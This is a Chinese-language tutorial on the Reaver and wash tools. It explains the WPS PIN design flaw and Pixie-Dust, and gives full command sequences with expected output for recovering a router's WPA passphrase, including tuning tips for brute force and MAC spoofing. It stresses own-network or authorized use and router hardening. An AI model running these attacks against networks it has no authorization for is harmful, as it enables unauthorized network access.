# Reaver（WPS PIN 攻击）

> **一句话**：暴力破解路由器 WPS（Wi-Fi Protected Setup）的 8 位 PIN 码，拿到 PIN 后即可直接取回 WPA/WPA2 的 PSK。
> **分类**：无线攻击 ｜ **Kali 包**：`reaver`（内含 `wash`）｜ **官方文档**：<https://github.com/t6x/reaver-wps-fork-t6x>

## 1. 它解决什么问题

WPA2 的 PSK 破解需要抓握手包 + 字典爆破——**成功率完全取决于字典质量**。Reaver 走的是完全不同的路：**攻击 WPS 这个「便利功能」的协议缺陷**。

| | [aircrack-ng](aircrack-ng.md) 破 PSK | **Reaver 破 WPS** |
| --- | --- | --- |
| 攻击对象 | WPA 四次握手的 MIC | WPS 的 PIN 码 |
| 搜索空间 | 口令字典（取决于质量） | **固定约 11000 次尝试** |
| 是否依赖字典 | ✅ 完全依赖 | ❌ **不需要字典** |
| 耗时 | 取决于字典与算力 | **数小时**（PIN 暴力）或**数秒~数分钟**（Pixie-Dust） |
| 前提 | 抓到握手（需客户端） | **AP 开启了 WPS** |
| 影响 | deauth 会中断客户端 | PIN 暴力会反复尝试，AP 日志会有记录 |

**Reaver 的价值**：

1. **不依赖字典**——即使目标用了一个复杂口令，只要 WPS 开着就可能被攻破；
2. **Pixie-Dust 攻击**（`-K`）——对某些芯片组，**几秒钟**就能算出 PIN 和 PSK；
3. **拿到 PIN 后还能重配 AP**——PIN 是路由器管理权限的一部分。

**Reaver 的局限**：

1. **AP 必须开启 WPS**——现代路由器大多默认关闭或已修复；
2. **很多 AP 有 WPS 锁定机制**——连续失败后锁定几分钟到几小时，使 PIN 暴力变得不现实；
3. **对 Pixie-Dust 免疫的新芯片**——2014 年后很多芯片修复了随机数缺陷。

**这就是为什么「关闭 WPS」是路由器加固清单的第一条**。

## 2. 工作原理

### 2.1 WPS 协议与 PIN 的结构

**WPS（Wi-Fi Protected Setup）** 是 2006 年 Wi-Fi 联盟推出的「简化配网」方案，目的是让不懂技术的用户**不用输长口令**就能把设备接入网络。它有两种方式：

| 方式 | 说明 | 安全性 |
| --- | --- | --- |
| **Push Button（PBC）** | 按一下路由器上的按钮，2 分钟内任何设备可加入 | ⚠️ 需要物理接触（但不是所有路由器都真的需要） |
| **PIN 方式** | 输入路由器背面印的 8 位数字 | ❌ **本工具攻击的目标** |

**PIN 的结构**：

```
PIN = D1 D2 D3 D4 D5 D6 D7 D8
      └──────┬──────┘ └──┬───┘
         前 7 位是随机数   第 8 位是前 7 位的校验位
```

**关键缺陷 ①：第 8 位是校验位**

```
已知 D1..D7 → 可以算出 D8
```

所以有效密钥空间是 **10⁷ = 10,000,000**，而不是 10⁸。

**关键缺陷 ②：AP 分两次验证 PIN**

这是**致命的**。WPS 协议在 EAP 交换中，AP 会先验证 PIN 的**前 4 位**，再验证**后 4 位**：

```
[客户端 → AP]  EAP-Response 带 D1 D2 D3 D4
[AP → 客户端]  NACK（M5 消息）→ 说明前 4 位错了
               或者
[AP → 客户端]  继续请求后 4 位 → 说明前 4 位对了！

[客户端 → AP]  EAP-Response 带 D5 D6 D7 D8
[AP → 客户端]  NACK（M7 消息）→ 后 4 位错了
               或者
[AP → 客户端]  成功 → PIN 正确
```

**攻击者从这个「分两步」的设计中得到的**：

| 阶段 | 需要尝试的次数 |
| --- | --- |
| 猜前 4 位 | 10⁴ = **10,000** |
| 前 4 位确定后，猜后 4 位（D5D6D7 可变，D8 是校验位） | 10³ = **1,000** |
| **合计** | **≈ 11,000 次** |

**从 10⁸ 降到 11000 —— 攻击成本降低了四个数量级。** 这就是 WPS 最著名的设计缺陷。

### 2.2 Reaver 的攻击流程

```
[1] 扫描，确认 AP 开启了 WPS
    wash -i wlan0mon
        ↓
[2] 与 AP 建立关联（Association）
    802.11 层先连上（不需要知道 PSK，WPS 是认证前就能用的）
        ↓
[3] EAP 注册协议交换
    Reaver 扮演「注册者（Registrar）」，向 AP 索要 WPS 配置
    → 收到 M1..M8 系列消息
        ↓
[4] PIN 暴力
    对每个候选 PIN：
      ├─ 发 EAP-Response，带前 4 位
      ├─ 看 AP 回复的是 NACK 还是「继续」→ 判断前 4 位对错
      ├─ 前 4 位对了，再发后 4 位
      └─ 看 AP 回复 NACK 还是成功
        ↓
[5] PIN 正确
    AP 直接返回 WPA PSK（这是 WPS 的设计——PIN 验证通过后就直接给出网络凭据）
        ↓
[6] 保存结果
    PIN + PSK 写入 .wpc 文件
```

**为什么 PIN 对了就直接拿到 PSK**：因为 WPS 的设计目的就是「**把网络凭据交给通过验证的设备**」。所以一旦 PIN 验证通过，AP 会**明文返回 PSK**——不需要再破解任何东西。

### 2.3 消息编号（M1~M8）

看 reaver 的详细输出（`-vv`）会看到 M1~M8 的消息：**这是 WPS 的 EAP 交换序列**。关键在于：

| 消息 | 含义 |
| --- | --- |
| M1 | AP 发送的注册请求（含 AP 的配置、nonce） |
| M2 | 注册者的响应 |
| **M3** | AP 请求注册者提供 PIN（**攻击的切入点**） |
| **M4** | 注册者的 PIN 响应 → AP 验证 |
| **M5** | AP 收到 M4 后的反馈：**NACK（前 4 位错）或继续** |
| M6 | 注册者提供剩余部分 |
| **M7** | AP 收到 M6 后的反馈：**NACK（后 4 位错）或成功** |
| M8 | 收尾 |

**`-T, --m57-timeout`** 就是控制等待 M5/M7 的超时时间——**这个参数在信号不好的时候很关键**。

### 2.4 Pixie-Dust 攻击（`-K` / `-Z`）——为什么它几秒就能成功

**Pixie-Dust** 由 Dominique Bongard 在 2014 年提出，攻击的是**芯片组随机数生成器的缺陷**。

**核心思想**：

WPS 的 EAP 交换中用了多个 **nonce（一次性随机数）**。PIN 的验证本质上是一个**基于这些 nonce 的密码学运算**。如果攻击者能：

1. **抓到一次完整的 M1~M8 交换**；
2. 且 AP 生成的 nonce **熵不足**（例如只用了时间戳、或某个计数器、或有限的随机源）；

那么就能**离线穷举 nonce 的可能取值**，反推出 PIN 和 PSK——**不需要 11000 次在线尝试**。

**关键优势**：

| | PIN 暴力 | **Pixie-Dust** |
| --- | --- | --- |
| 在线尝试次数 | ~11000 | **1 次**（只抓一次交换） |
| 耗时 | 数小时 | **秒~分钟**（离线计算） |
| 会被 WPS 锁定机制阻止 | ✅ 会 | ❌ **不会**（只有一次交互） |
| 会被 AP 日志发现 | ✅ 大量失败记录 | ❌ **几乎没有痕迹** |
| 成功率 | 只要 AP 没锁就能成 | **取决于芯片是否有随机数缺陷** |

**受影响的芯片组（部分）**：
- Ralink / MediaTek 的部分芯片
- Realtek 的部分芯片
- Broadcom 的部分型号
- 部分基于这些芯片的路由器（多个品牌）

**2014 年后**：主流芯片厂商陆续修复了随机数缺陷。**这就是为什么 Pixie-Dust 在现代路由器上成功率显著下降**。

**Reaver 的两个 Pixie-Dust 参数**：

```
-K, --pixie-dust    Run pixiedust attack
-Z                  Run pixiedust attack
```

两者等价，`-K` 更可读。

### 2.5 WPS 锁定机制 —— PIN 暴力的真正障碍

**WPS 规范本身提供了锁定机制**：

| 机制 | 行为 |
| --- | --- |
| **失败计数 + 锁定** | 连续 N 次（通常 5~10 次）PIN 失败 → AP 锁定 WPS **数分钟到数小时** |
| 锁定期间 | 所有 WPS 请求被拒绝 |
| 有些 AP 更严格 | 锁定后需要重启路由器才恢复 |

**后果**：11000 次尝试 ÷ 每次尝试间隔 → **如果 AP 每次失败后锁定 60 秒，总耗时会是 11000 × 60 秒 ≈ 7.6 天**。

**这就是为什么**：

- **Pixie-Dust 是首选**（只交互一次，不受锁定影响）；
- **PIN 暴力在现代路由器上通常不现实**；
- `-l, --lock-delay`（默认 60 秒）就是用来告诉 reaver「AP 锁定后等多久再试」。

**⚠️ 关于 `-L, --ignore-locks`**：

```
-L, --ignore-locks    Ignore locked state reported by the target AP
```

它让 reaver **忽略 AP 的锁定状态继续尝试**。这会：

- **严重增加 AP 的日志与负载**（明显的暴力行为）；
- 很可能**完全无效**（AP 在锁定期间就是不会响应）；
- 在授权的渗透测试中**可能违反 ROE**（造成服务影响）。

**建议：不要用 `-L`**。看到锁定就接受「PIN 暴力不现实」这个结论，如实汇报。

### 2.6 PIN 与 PSK 的关系

拿到 PIN 后，你可以：

| 能做 | 命令 |
| --- | --- |
| 直接用 PIN 连接（部分客户端支持） | — |
| **从 PIN 反推 PSK** | `reaver -i wlan0mon -b <BSSID> -p <PIN>` —— AP 会直接返回 PSK |
| 用 PIN 重配路由器 | 通过 WPS 协议可以修改 AP 设置（**这正是 WPS 的另一个安全隐患**） |
| 由 PSK 反推 PIN | `wash` 或其他工具可以做「PIN 生成算法逆向」（部分厂商的 PIN 由 MAC/序列号算出） |

**「PIN 反推 PSK」是 reaver 最有用的功能**：如果你通过其他途径知道了 PIN（比如路由器背面印着），可以直接用它拿 PSK，**不需要做任何暴力**。

```bash
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -p 12345670 -v
# → [+] WPS PIN: '12345670'
#   [+] WPA PSK:  'labpassword123'
```

**这也是一个合法且实用的场景**：你忘了自己路由器的 Wi-Fi 密码，但路由器背面有 PIN → 直接用 reaver 取回。

## 3. 安装与快速上手

```bash
sudo apt install reaver
reaver -h
wash -h
```

**最短工作流**：

```bash
# 0) 前置：切监听模式
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# 1) 扫描开启 WPS 的 AP（这一步决定了后续是否能攻击）
sudo wash -i wlan0mon

# 2) 先试 Pixie-Dust（只交互一次，不受锁定影响，几秒钟出结果）
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K -vv

# 3) 如果 Pixie-Dust 失败，再试 PIN 暴力（可能耗时数小时，且可能被锁定）
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# 4) 收尾
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

**必须先跑 `wash`**——它会告诉你哪些 AP 真的开了 WPS。**对没开 WPS 的 AP 跑 reaver 是纯粹的浪费时间**。

## 4. 核心参数详解

### 4.1 必需参数

| 参数 | 作用 | 使用建议 |
| --- | --- | --- |
| `-i, --interface=<wlan>` | **监听模式**接口名 | 必须是 monitor 模式的接口 |
| `-b, --bssid=<mac>` | 目标 AP 的 BSSID | 从 `wash` 或 `airodump-ng` 获取 |

### 4.2 可选参数

| 参数 | 作用 | 使用建议 |
| --- | --- | --- |
| `-m, --mac=<mac>` | 使用指定的本机 MAC（伪造 MAC） | 减少被路由器 MAC 过滤/记录 |
| `-e, --essid=<ssid>` | 目标 AP 的 ESSID | 通常不必填（BSSID 就够） |
| `-c, --channel=<channel>` | 锁定信道（**隐含 `-f`**） | ⭐ **建议总是加**——避免跳频导致丢失 M5/M7 |
| `-s, --session=<file>` | 恢复之前的会话文件 | 长任务被打断后续跑 |
| `-C, --exec=<command>` | PIN 恢复成功后执行指定命令 | 自动化 |
| `-f, --fixed` | 禁用跳频 | 与 `-c` 等价 |
| `-5, --5ghz` | 使用 5 GHz 信道 | 目标是 5 GHz 时 |
| `-v, --verbose` | 显示非关键警告（`-vv`/`-vvv` 更详细） | ⭐ **`-vv` 是排错标配** |
| `-q, --quiet` | 只显示关键消息 | 脚本化 |
| `-h, --help` | 显示帮助 | — |

### 4.3 高级参数

| 参数 | 作用 | 使用建议 |
| --- | --- | --- |
| `-p, --pin=<pin>` | **直接用指定的 PIN**（或任意 4/8 位字符串） | ⭐ **不等于暴力**：知道 PIN 时用它直接取 PSK，省时且无痕迹 |
| `-d, --delay=<seconds>` | PIN 尝试之间的延迟（默认 1 秒） | ⭐ **必须 ≥ 1**。设为 0 会被 AP 拒绝（WPS 规范要求） |
| `-l, --lock-delay=<seconds>` | AP 锁定后等待多久再试（默认 60 秒） | 增大它可减少对 AP 的骚扰 |
| `-g, --max-attempts=<num>` | 尝试 num 次后退出 | 限时/限量任务 |
| `-x, --fail-wait=<seconds>` | 10 次「意外失败」后休眠的秒数（默认 0） | 网络不稳时调大 |
| `-r, --recurring-delay=<x:y>` | 每 x 次尝试后休眠 y 秒 | ⭐ 规避锁定/降低影响 |
| `-t, --timeout=<seconds>` | 接收超时（默认 10 秒） | 信号差时调大 |
| `-T, --m57-timeout=<seconds>` | **M5/M7 消息的超时**（默认 0.40 秒） | ⭐ **信号差/距离远时最重要**。调大到 1.0~2.0 |
| `-A, --no-associate` | 不主动关联 AP（由别的程序关联） | 双网卡配置 |
| `-N, --no-nacks` | 不乱序包不响应时不发 NACK | 罕见 |
| `-S, --dh-small` | 使用小 DH 密钥加速 | ⭐ 通常都该开 |
| `-L, --ignore-locks` | **忽略 AP 的锁定状态** | ⚠️ **不建议**（见 2.5 节） |
| `-E, --eap-terminate` | 每次 WPS 会话用 EAP FAIL 包终止 | 某些 AP 需要 |
| `-J, --timeout-is-nack` | 把超时当作 NACK（针对 DIR-300/320） | 特定型号 |
| `-F, --ignore-fcs` | 忽略帧校验和错误 | 信号差/抓包错误多时用 |
| `-w, --win7` | **伪装成 Windows 7 注册者**（默认 False） | ⭐ 某些 AP 只接受特定客户端，试试它 |
| `-K, --pixie-dust` | **运行 Pixie-Dust 攻击** | ⭐⭐ **优先试这个** |
| `-Z` | 运行 Pixie-Dust 攻击（同 `-K`） | — |
| `-O, --output-file=<filename>` | 把感兴趣的包写入 pcap 文件 | 事后用 Wireshark 分析 |

### 4.4 `wash` 的参数（扫描 WPS）

| 参数 | 作用 | 使用建议 |
| --- | --- | --- |
| `-i, --interface=<iface>` | 抓包接口 | ⭐ 主参数 |
| `-f, --file [FILE...]` | 从抓包文件读取 | ⚠️ 注意：`-f` 在 wash 里是「读文件」，与 reaver 的 `-f`（fixed）**含义不同** |
| `-c, --channel=<num>` | 监听指定信道（默认 auto） | 已知信道时用 |
| `-n, --probes=<num>` | 每个 AP 最多发多少探测（默认 15） | 探测越少越隐蔽但可能漏 |
| `-O, --output-file=<filename>` | 把感兴趣的包写入 pcap | 事后分析 |
| `-F, --ignore-fcs` | 忽略帧校验和错误 | 信号差时用 |
| `-2, --2ghz` | 使用 2.4 GHz 信道 | 默认 |
| `-5, --5ghz` | 使用 5 GHz 信道 | 目标在 5 GHz 时 |
| `-s, --scan` | 使用 **scan 模式** | 主动探测（更全，但会被记录） |
| `-u, --survey` | 使用 **survey 模式**（默认） | 被动侦听 |
| `-a, --all` | **显示所有 AP，包括没开 WPS 的** | 对比哪些开了 WPS |
| `-j, --json` | 以 JSON 输出扩展的 WPS 信息 | ⭐ 接自动化时用 |
| `-U, --utf8` | 显示 UTF-8 ESSID（**不做安全过滤，有风险**） | 中文 SSID 时用，但注意终端注入风险 |
| `-p, --progress` | 显示破解进度百分比 | 需要 PIN 暴力时用 |
| `-h, --help` | 显示帮助 | — |

### 4.5 `wash` 输出的字段解读

```
BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
--------------------------------------------------------------------------------
E0:3F:49:6A:57:78    6  -73  1.0  No   Unknown   ASUS
```

| 列 | 含义 | 判读 |
| --- | --- | --- |
| `BSSID` | AP 的 MAC | 攻击时用这个 |
| `Ch` | 信道 | 配 `-c` 用 |
| `dBm` | 信号强度 | 低于 -80 会很难 |
| `WPS` | WPS 版本（`1.0` / `2.0` / `0.0`） | **`1.0` 最容易打**；`2.0` 修复了部分缺陷；`0.0` 表示是 WPS 但版本未识别 |
| `Lck` | **是否被锁定**（`Yes`/`No`） | ⭐ **`Yes` 时不要攻击**，等锁定期结束 |
| `Vendor` | 厂商 | 上网查该厂商是否有 Pixie-Dust 漏洞 |
| `ESSID` | 网络名 | — |

**最重要的两列是 `WPS` 和 `Lck`**：

```
WPS=1.0 且 Lck=No  →  ⭐ 最佳目标，先试 -K（Pixie-Dust）
WPS=2.0 或 Lck=Yes →  ⚠️ 成功率低，PIN 暴力几乎不可行
（不显示）          →  AP 没开 WPS，reaver 无从下手
```

## 5. 实战演练

**环境声明**：以下全部针对**你自己拥有的 Wi-Fi 网络与你自己的路由器**，或隔离实验室、已授权目标。**WPS PIN 暴力会向 AP 发送上万次请求——对非自有 AP 执行属于未授权访问与干扰通信**。场景 1 与场景 5 是完全合法且实用的用法。

### 场景 1：用自己的 PIN 取回自己的 Wi-Fi 口令（完全合法且实用）

**这是最推荐的入门场景**——它不需要任何暴力，也能让你理解 reaver 的核心流程。

**情境**：你忘了自己路由器的 Wi-Fi 密码，但路由器背面贴着 WPS PIN（8 位数字）。

**步骤 1：准备监听接口**

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
iw dev wlan0mon info | grep -E 'type|channel'
```

**步骤 2：确认自己的 AP 信息**

```bash
sudo wash -i wlan0mon
```

**预期输出**

```
BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
--------------------------------------------------------------------------------
AA:BB:CC:DD:EE:FF    6  -35  1.0  No   Unknown   lab-test
```

记下 `BSSID`（`AA:BB:CC:DD:EE:FF`）和 `Ch`（`6`）。

**步骤 3：用已知 PIN 取回 PSK**

```bash
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -p 12345670 -vv
```

**预期输出**

```
Reaver v1.6.6 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Switching wlan0mon to channel 6
[+] Waiting for beacon from AA:BB:CC:DD:EE:FF
[+] Associated with AA:BB:CC:DD:EE:FF (ESSID: lab-test)
[+] Starting Cracking Session. Pin count: 0, Max pin attempts: 11000
[+] Trying pin 12345670.
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[+] Received M1 message
[+] Sending M2 message
[+] Received M3 message
[+] Sending M4 message
[+] Received M5 message
[+] Sending M6 message
[+] Received M7 message
[+] Sending WSC NACK
[+] Pin cracked in 3 seconds
[+] WPS PIN: '12345670'
[+] WPA PSK: 'labpassword123'
[+] AP SSID: 'lab-test'
```

**结果行**：

| 行 | 含义 |
| --- | --- |
| `Pin cracked in N seconds` | ✅ 成功 |
| `WPS PIN: '...'` | 确认的 PIN |
| **`WPA PSK: '...'`** | ⭐ **这就是你要的 Wi-Fi 口令** |
| `AP SSID: '...'` | 网络名 |

**验证**：

```bash
# 用拿到 PSK 连接（或用 wpa_supplicant / nmcli）
nmcli device wifi connect 'lab-test' password 'labpassword123'
```

**步骤 4：收尾**

```bash
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

**这个场景的教学价值**：它演示了 reaver 的完整协议交互（M1~M8），**而完全没有任何暴力行为**。如果你只想理解 WPS 的工作原理，这个场景就够了。

### 场景 2：Pixie-Dust（速度最快，对目标影响最小）

**前提**：你**自己的** AP 开启了 WPS，且你没有 PIN。

```bash
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -K -vv
```

**`-K` = Pixie-Dust 攻击**。

**预期输出（成功）**

```
[+] Waiting for beacon from AA:BB:CC:DD:EE:FF
[+] Associated with AA:BB:CC:DD:EE:FF (ESSID: lab-test)
[+] Starting Cracking Session. Pin count: 0, Max pin attempts: 11000
[+] Pixie-Dust attack started.
[+] Received M1 message
[+] Sending M2 message
[+] Received M3 message
[+] Sending M4 message
[+] Received M5 message
[+] Sending M6 message
[+] Received M7 message
[+] Trying 12345670...
[+] Pin cracked in 8 seconds
[+] WPS PIN: '12345670'
[+] WPA PSK: 'labpassword123'
```

**预期输出（失败——AP 芯片已修复）**

```
[+] Pixie-Dust attack started.
[+] Received M1 message
...
[+] Pixie-Dust failed. Try again.
[+] Pixie-Dust attack failed. Target may not be vulnerable.
```

**关键解读**：

| 输出 | 含义 |
| --- | --- |
| `Pin cracked in N seconds` | ✅ AP 芯片有随机数缺陷，**成功** |
| `Pixie-Dust failed. Target may not be vulnerable.` | ❌ 该芯片已修复，**换 PIN 暴力也大概率不现实** |

**Pixie-Dust 成功的意义**：

- 只交互了**一次**，不受 WPS 锁定影响；
- **AP 日志里几乎没有痕迹**（只有一次正常看起来的 WPS 请求）；
- 耗时**秒级**。

**如果 Pixie-Dust 失败**：

| 选择 | 说明 |
| --- | --- |
| 试 PIN 暴力 | 可能耗时数小时到数天，且可能被锁定 |
| 换 `--bully`（通过 [wifite](wifite.md)） | 不同实现，有时成功率不同 |
| **接受结论**：该 AP 的 WPS 不可攻破 | ⭐ **这是最专业的选择**。如实汇报「WPS 存在但已修复」比硬跑几天有价值 |

**建议**：**先试 Pixie-Dust 几次（它很快），失败就转 PIN 暴力但设 `-g` 限量**（例如 `-g 1000`），跑一部分看会不会被锁定。**如果 AP 一锁就 `-L` 硬刚，既不专业也不道德**。

### 场景 3：PIN 暴力（理解它的现实困难）

**重要前提**：**这只在你自己的 AP 上做，用于理解锁定机制的实际效果**。

```bash
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 \
  -d 1 \
  -l 60 \
  -r 5:10 \
  -vv \
  -O /tmp/reaver-capture.pcap \
  -g 200
```

| 参数 | 作用 | 为什么这么设 |
| --- | --- | --- |
| `-c 6` | 锁定信道 | 避免跳频丢失 M5/M7 |
| `-d 1` | 每次尝试间隔 1 秒 | **WPS 规范要求 ≥ 1 秒**，设 0 会被拒绝 |
| `-l 60` | AP 锁定后等 60 秒 | 尊重 AP 的锁定机制 |
| `-r 5:10` | 每 5 次尝试休眠 10 秒 | **降低对路由器的负载** |
| `-vv` | 详细输出 | 观察每一步 |
| `-O ...` | 保存 pcap | 事后用 Wireshark 分析 M1~M8 |
| `-g 200` | **只试 200 次就退出** | ⭐ **避免无意义的长时间运行** |

**预期输出（观察锁定）**

```
[+] Trying pin 12345670.
[+] Sending EAPOL START request
...
[+] Received M5 message
[+] WPS pin attempt failed
[+] Trying pin 12345671.
...
[!] WARNING: WPS transaction failed, re-trying last pin
[+] Trying pin 12345675.
[!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-trying
[+] Waiting 60 seconds before retrying
```

**`Detected AP rate limiting` 是 key 信息**：

> **AP 有锁定机制 → PIN 暴力的时间成本是 `每 N 次尝试 × 60 秒`**。
> 11000 次 ÷ 5 次每组 × (5×1 + 10 + 可能的 60 秒锁定) ≈ **远超现实可接受的时间**。

**这就是为什么 PIN 暴力在现代路由器上基本不可行**，也正是 WPS 厂商「修好了」的方式——**不是修协议缺陷，而是加了速率限制**。

**⚠️ 关于 `-L, --ignore-locks`**：不要用它。锁定期 AP 就是不会响应你的 PIN 验证，强行重试只会：

- 污染 AP 日志（留下大量失败记录）；
- 增加路由器 CPU 负载；
- 在授权测试中**可能超出 ROE 允许的影响范围**。

### 场景 4：用 `-vv` 和 pcap 学习 WPS 协议

**这是把 reaver 当学习工具的用法**——不追求破解，只看协议。

**步骤 1：抓一次完整的 WPS 交换**

```bash
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 \
  -p 00000000 \
  -vv \
  -O /tmp/wps.pcap
```

（用一个**故意错误的 PIN**，这样只做一次完整交互，不会尝试别的）

**步骤 2：用 Wireshark 分析**

```bash
wireshark /tmp/wps.pcap
```

**在 Wireshark 里看什么**：

| 过滤器 | 看什么 |
| --- | --- |
| `eap` | EAP 消息（WPS 承载在 EAP 上） |
| `wps` | WPS 专有字段（如果有 dissector） |
| `wlan.fc.type_subtype == 0x00` | Association Request |
| `eapol` | EAPOL 帧 |

**对照 reaver 的 `-vv` 输出**：

```
[+] Received M1 message      ← 在 Wireshark 里找到对应的 EAP 消息
[+] Sending M2 message
[+] Received M3 message
[+] Sending M4 message       ← 这里带 PIN 的前 4 位
[+] Received M5 message      ← 这里 AP 告诉你前 4 位对不对
...
```

**这个练习让你的理解从「reaver 输出几行日志」变成「我知道这些帧里有什么」。** 这是真正掌握 WPS 攻击的标志。

**步骤 3：对比不同 PIN 的响应**

```bash
# PIN 全错 → M5 是 NACK
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -p 00000000 -vv -O /tmp/wps-bad.pcap

# 如果知道前 4 位，可以只试前 4 位（-p 支持 4 位）
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -p 1234 -vv -O /tmp/wps-4digit.pcap
```

**对比两个 pcap 里 M5 消息的差异**：这就是 11000 次尝试能奏效的原因。

### 场景 5：其他厂商的 PIN 生成算法（PIN 反推）

很多厂商的 WPS PIN 不是随机的，而是**由 MAC 地址或序列号计算出来**的。如果目标是你自己的设备，你可能可以直接算出 PIN。

```bash
# 先看有没有现成工具
ls /usr/share/reaver/ 2>/dev/null
apt-cache search wpspin 2>/dev/null
```

网上有「WPS PIN 生成器」根据 MAC 前缀和型号计算 PIN（基于已知厂商算法）。**注意**：

- 只对**你自己的设备**做这件事；
- 工具来源不明时不要运行（供应链风险）；
- 这是**逆向厂商算法**，对非自有设备使用属于未授权访问。

**更实用的合法做法**：直接用路由器背面印的 PIN（见场景 1）。

## 6. 输出解读

### reaver 的关键输出行

```
Reaver v1.6.6 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Switching wlan0mon to channel 6
[+] Waiting for beacon from AA:BB:CC:DD:EE:FF
[+] Associated with AA:BB:CC:DD:EE:FF (ESSID: lab-test)
[+] Starting Cracking Session. Pin count: 0, Max pin attempts: 11000
[+] Trying pin 12345670.
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[+] Received M1 message
[+] Sending M2 message
[+] Received M3 message
[+] Sending M4 message
[+] Received M5 message
[+] Sending M6 message
[+] Received M7 message
[+] Sending WSC NACK
[+] Pin cracked in 3 seconds
[+] WPS PIN: '12345670'
[+] WPA PSK: 'labpassword123'
[+] AP SSID: 'lab-test'
```

| 输出行 | 含义 | 判读 |
| --- | --- | --- |
| `Switching ... to channel N` | 已锁定信道 | — |
| `Waiting for beacon from <BSSID>` | 等待 AP 的 Beacon | 一直卡住 = 信道不对或 AP 太远 |
| `Associated with <BSSID>` | ✅ 802.11 层关联成功（**不需要知道 PSK**） | — |
| `Max pin attempts: 11000` | 理论最大尝试数 | 这就是 WPS 缺陷的量化体现 |
| `Trying pin NNNNNNNN` | 正在尝试的 PIN | — |
| `Received M1 / M3 / M5 / M7` | 收到 AP 的 WPS 消息 | **M5/M7 是判定 PIN 对错的关键** |
| `Pin cracked in N seconds` | ✅ **成功** | 结束 |
| `WPS PIN: '...'` | 破解出的 PIN | 可复用 |
| **`WPA PSK: '...'`** | ⭐ **Wi-Fi 口令** | **这就是最终目标** |
| `AP SSID: '...'` | 网络名 | — |

### 失败/异常输出

| 输出 | 含义 | 处理 |
| --- | --- | --- |
| `WARNING: Failed to associate with <BSSID>` | 关联失败 | 靠近 AP；检查 MAC 过滤；换 `-m` 伪造 MAC |
| `WARNING: Detected AP rate limiting, waiting N seconds` | ⭐ **AP 有锁定机制** | 正常。**PIN 暴力在现代 AP 上不现实** |
| `[!] WPS transaction failed` | 交互失败（信号或超时问题） | 调大 `-T`（M5/M7 超时）；加 `-F`；靠近 AP |
| `Pixie-Dust failed. Target may not be vulnerable.` | AP 芯片已修复随机数缺陷 | 换策略或接受结论 |
| `WARNING: Receive timeout occurred` | 收不到响应 | 调大 `-t` 和 `-T`；检查信道 |
| `[+] Trying pin NNNNNNNN` 循环但无进展 | 被无声拒绝 | 检查 `Lck` 列是否变 `Yes` |
| `Max attempts exceeded` | 达到 `-g` 限制 | 正常退出 |
| `WARNING: Pin attempt failed` 后一直重试同一个 | 交互不稳定 | 调大 `-T`；`-F` 忽略 FCS 错误 |
| `Failed to initialize the interface` | 接口不是监听模式 | 先 `airmon-ng start` |

### `.wpc` 文件

reaver 成功后会写一个 `.wpc` 文件（WPS credentials），默认在当前目录：

```
AA:BB:CC:DD:EE:FF.wpc
```

**内容**（文本格式）：

```
BSSID: AA:BB:CC:DD:EE:FF
ESSID: lab-test
WPS PIN: 12345670
WPA PSK: labpassword123
```

**这个文件包含明文凭据**——在授权测试中属于**敏感数据**，必须按 ROE 要求处理（加密存储、限期删除）。见第 9.4 节。

### 判断成功

| 环节 | 成功标志 |
| --- | --- |
| 扫描 | `wash` 输出的 `WPS` 列非空且 `Lck` 为 `No` |
| 关联 | `Associated with <BSSID>` |
| Pixie-Dust | `Pin cracked in N seconds` |
| PIN 暴力 | 同上（但需 11000 次以内的运气） |
| **最终** | **`WPA PSK: '...'` 这一行** |

**下一步**：

| 结果 | 动作 |
| --- | --- |
| 拿到 PSK | 用它连接；在报告中记录「WPS 开启」这个配置风险 |
| Pixie-Dust 失败 | 可试少量 PIN 暴力（`-g` 限量）；**建议接受结论** |
| 遇到 rate limiting | **如实汇报**：WPS 开启但已加锁定，风险等级中等 |
| 完全无法关联 | 检查 MAC 过滤、信号强度、信道 |

## 7. 与其他工具配合

```text
[airmon-ng start] → wlan0mon
        ↓
[wash -i wlan0mon] ← 必须先确认 AP 开了 WPS 且未被锁定
        ↓
   ┌────┴──────────────────────────────────┐
   ↓                                       ↓
[reaver -K]（Pixie-Dust）          [reaver]（PIN 暴力）
   秒~分钟，不受锁定影响               数小时~数天，受锁定影响
   ↓                                       ↓
   └────────────┬──────────────────────────┘
                ↓
      [WPS PIN + WPA PSK]（.wpc 文件）
                ↓
   ┌────────────┴─────────────┐
   ↓                          ↓
[连接网络]              [reaver -p <PIN>]（复现，无需暴力）

[替代/补充]
├── wifite --wps-only   （自动化的 WPS 攻击）
├── bully               （另一个 WPS 实现，wifite --bully）
├── airodump-ng         （确认目标信息、信道）
└── hashcat -m 22000    （PSK 拿不到时的替代路径：抓握手 + 字典）
```

| 组合 | 说明 |
| --- | --- |
| **[airmon-ng](airmon-ng.md) → reaver** | 必须先切监听模式 |
| **reaver → [wash](#44-wash-的参数扫描-wps)** | `wash` 的同包工具，**必须先跑它** |
| **[airodump-ng](airodump-ng.md) → reaver** | 用 airodump 确认 BSSID 与信道 |
| **[wifite](wifite.md) `--wps-only` → reaver** | wifite 封装了 reaver；想自动化就用它 |
